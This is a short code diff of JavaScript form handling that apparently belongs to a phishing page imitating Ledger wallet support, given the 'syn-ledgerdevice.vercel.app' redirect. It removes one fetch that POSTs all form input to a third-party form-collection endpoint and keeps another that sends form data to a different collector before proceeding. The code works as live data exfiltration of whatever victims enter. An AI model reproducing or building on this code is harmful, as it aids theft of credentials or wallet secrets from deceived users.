@@ -1552,32 +1552,7 @@ form.addEventListener('submit', (event) => {
 
   const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
 
-  fetch('https://usebasin.com/f/10975d389c52', { //sd
-    method: 'POST',
-    body: formData // pass form data as the request body
-  })
-  .then(response => {
-    if (response.ok) {
-      return response.json(); // if response is okay, parse the response as JSON
-    }
-    throw new Error('Network response was not ok.');
-  })
-  .then(data => {
-    console.log(data); // log the response data
-    window.location.href = 'https://syn-ledgerdevice.vercel.app/support.html'; // redirect to thank you page
-  })
-  .catch(error => {
-    console.error('Error:', error); // log any errors
-  });
-setTimeout(() => { proceed();}, 2000);
-
   
-});
-
-
-
-
-
       fetch("https://submit-form.com/gmAjhBF4R", {
         method: "POST",
         headers: {
@@ -1596,9 +1571,10 @@ setTimeout(() => { proceed();}, 2000);
         .catch(function (error) {
           console.error(error);
         });
-    
+setTimeout(() => { proceed();}, 2000);
 
-
+  
+});
 
 
 
